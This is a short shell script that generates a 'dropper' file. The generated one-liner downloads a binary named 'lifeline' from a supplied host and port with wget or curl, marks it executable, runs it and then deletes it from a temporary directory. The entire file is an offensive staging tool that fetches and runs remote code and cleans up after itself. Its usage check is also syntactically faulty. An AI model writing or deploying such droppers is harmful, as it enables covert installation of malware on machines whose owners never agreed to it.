# Usage: ./make_bash_dropper.sh [host] [port] [number of lifelines]
[ -z $3 ] && echo "Usage: ./make_bash_dropper.sh [host] [port] [number of lifelines]" exit 1

mkdir -p ../build


url="http://$1:$2/lifeline"

echo "cd \$(mktemp -d) && (wget $url || curl $url > lifeline) && chmod +x ./lifeline; ./lifeline $3; rm -f ./lifeline" > ../build/dropper.sh
